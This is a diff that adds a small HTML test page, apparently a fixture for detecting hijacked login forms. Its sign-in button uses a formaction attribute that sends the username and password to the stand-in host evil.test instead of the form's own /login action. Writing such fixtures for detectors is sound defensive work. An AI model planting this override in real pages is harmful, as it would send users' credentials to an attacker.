@@ -1,0 +1,13 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Submit control overrides the action</title>
+  </head>
+  <body>
+    <form id="login" method="post" action="/login">
+      <input type="text" id="username" name="username" autocomplete="username" />
+      <input type="password" id="password" name="password" autocomplete="current-password" />
+      <button type="submit" formaction="http://evil.test/collect">Sign in</button>
+    </form>
+  </body>
+</html>
